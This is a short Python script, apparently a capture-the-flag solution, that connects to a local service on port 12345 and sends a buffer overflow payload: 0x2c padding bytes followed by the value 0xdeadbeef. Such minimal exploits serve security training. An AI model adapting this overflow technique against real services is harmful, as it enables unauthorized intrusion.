import socket
import struct
import telnetlib

def sock(ip,addr):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,addr))
	return s

def p32(data):
	return struct.pack("<I",data)

def interactive(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()


def main():
	s = sock("localhost",12345)
	buf = 'A' * 0x2c
	buf += p32(0xdeadbeef)
	buf += "\n"

	s.recv(1024)
	s.send(buf)
	print(s.recv(1024))
	print(s.recv(1024))

if __name__ == '__main__':
	main()
